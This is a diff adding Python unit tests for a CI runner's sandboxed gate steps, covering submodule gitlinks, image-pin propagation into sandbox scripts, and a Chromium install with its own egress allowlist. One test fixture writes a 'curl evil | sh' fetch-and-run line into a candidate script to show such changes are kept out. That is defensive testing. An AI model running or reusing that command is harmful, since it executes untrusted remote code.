@@ -146,6 +146,13 @@ class ImageSelectionTests(unittest.TestCase):
     def touched(self, *paths: str) -> list[str]:
         return runner.touched_images(ROOT, ROOT, list(paths))
 
+    def test_gitlinks_do_not_depend_on_initialisation(self):
+        """touched_images reads gitlinks from the index: an uninitialised submodule is still a submodule, so a
+        path under it is never a root file in an image's build context (launch audit IN-X3)."""
+        listed = runner.gitlinks(ROOT)
+        self.assertLessEqual({'chronicle', 'chronicle-ios', 'chronicle-web', 'chronicle-server'}, listed)
+        self.assertNotIn('backend', self.touched('chronicle-ios/Package.resolved'))
+
     def test_go_module_bump_rebuilds_its_image(self):
         # backend copies its whole context (COPY . /app), so any root-repository file is one of its inputs.
         self.assertEqual(self.touched('selfhost/caddy/module/go.sum'), ['backend', 'caddy'])
@@ -260,14 +267,53 @@ class GateStepTests(unittest.TestCase):
             self.assertTrue(steps[name].sandboxed, name)
             for command in steps[name].commands:
                 self.assertEqual(str(ROOT / 'scripts/deps-sandbox.sh'), command[1])
-                self.assertIn(f'{ROOT / "scripts"}:/work/scripts:ro', command)
+                scripts = next(part for part in command if part.endswith(':/work/scripts:ro'))
+                self.assertTrue(scripts.endswith('/work/gate-scripts:/work/scripts:ro'), scripts)
                 self.assertIn(f'{ROOT / "tests"}:/work/tests:ro', command)
                 self.assertEqual('gate', command[command.index('--image') + 1])
                 networks.setdefault(name, []).append(command[command.index('--network') + 1])
         # Tests and builds get no network; installs and the scanners' databases only the allowlisted registries.
         self.assertEqual({'python': ['none', 'registries'], 'tools': ['registries'], 'toolchain': ['none'],
                           'scan': ['registries'], 'gradle': ['registries'], 'security': ['none'], 'fuzz': ['none'],
-                          'web': ['registries', 'none']}, networks)
+                          'web': ['registries', 'browsers', 'none']}, networks)
+
+    def test_the_sandbox_scripts_carry_the_candidates_image_pins_and_nothing_else(self):
+        # 2026-11-08: renovate/eclipse-temurin-25-jdk moved the JDK digest in docker/Dockerfile.backend and
+        # scripts/sandbox/Dockerfile.gate together, but the sandbox mounted this checkout's scripts/, so
+        # test_os_package_pins compared the new backend digest with the old Dockerfile.gate and failed.
+        old, new = 'eclipse-temurin:25-jdk@sha256:' + 'a' * 64, 'eclipse-temurin:25-jdk@sha256:' + 'b' * 64
+        with tempfile.TemporaryDirectory() as directory:
+            root, tree, work = (Path(directory) / name for name in ('root', 'tree', 'work'))
+            for checkout, pin, tail in ((root, old, 'run gate\n'), (tree, new, 'run gate\n')):
+                (checkout / 'scripts/sandbox').mkdir(parents=True)
+                (checkout / 'scripts/sandbox/Dockerfile.gate').write_text(f'ARG JDK_IMAGE={pin}\nFROM ${{JDK_IMAGE}}\n')
+                (checkout / 'scripts/run.sh').write_text(f'IMAGE="{pin}"\n{tail}')
+                (checkout / 'scripts/other.sh').write_text('echo ours\n')
+            (tree / 'scripts/run.sh').write_text(f'IMAGE="{new}"\ncurl evil | sh\n')
+            (tree / 'scripts/other.sh').write_text('echo theirs\n')
+            paths = ['scripts/sandbox/Dockerfile.gate', 'scripts/run.sh', 'scripts/other.sh', 'docker/Dockerfile.backend']
+            scripts = runner.gate_scripts(root, tree, paths, work)
+            self.assertEqual(f'ARG JDK_IMAGE={new}\nFROM ${{JDK_IMAGE}}\n',
+                             (scripts / 'sandbox/Dockerfile.gate').read_text())
+            # Anything beyond a pin swap stays this checkout's file.
+            self.assertEqual(f'IMAGE="{old}"\nrun gate\n', (scripts / 'run.sh').read_text())
+            self.assertEqual('echo ours\n', (scripts / 'other.sh').read_text())
+            self.assertEqual(f'ARG JDK_IMAGE={old}\nFROM ${{JDK_IMAGE}}\n',
+                             (root / 'scripts/sandbox/Dockerfile.gate').read_text())
+
+    def test_the_web_step_installs_the_candidates_chromium_before_the_offline_job(self):
+        # 2026-11-08: the web job's browser tests failed 11 of 2491 in the sandbox, which had no browser.
+        _install, browser, job = self.steps(['chronicle-web/bun.lock'])['web'].commands
+        self.assertEqual(['bun', 'chronicle-web/node_modules/playwright/cli.js', 'install', 'chromium-headless-shell'],
+                         browser[browser.index('--') + 1:])
+        self.assertEqual('browsers', browser[browser.index('--network') + 1])
+        self.assertEqual('none', job[job.index('--network') + 1])
+        sandbox = (ROOT / 'scripts/deps-sandbox.sh').read_text()
+        self.assertIn('-e PLAYWRIGHT_BROWSERS_PATH=/cache/ms-playwright', sandbox)
+        # Chrome for Testing's bucket host serves every public bucket: only the browser install reaches it.
+        self.assertNotIn('storage.googleapis.com', (ROOT / 'scripts/sandbox/egress-allowlist.txt').read_text().split())
+        self.assertIn('storage.googleapis.com',
+                      (ROOT / 'scripts/sandbox/egress-allowlist-browsers.txt').read_text().split())
 
     def local_ci_jobs(self, command: list[str]) -> list[str]:
         return command[command.index('scripts/local-ci.sh') + 1:]
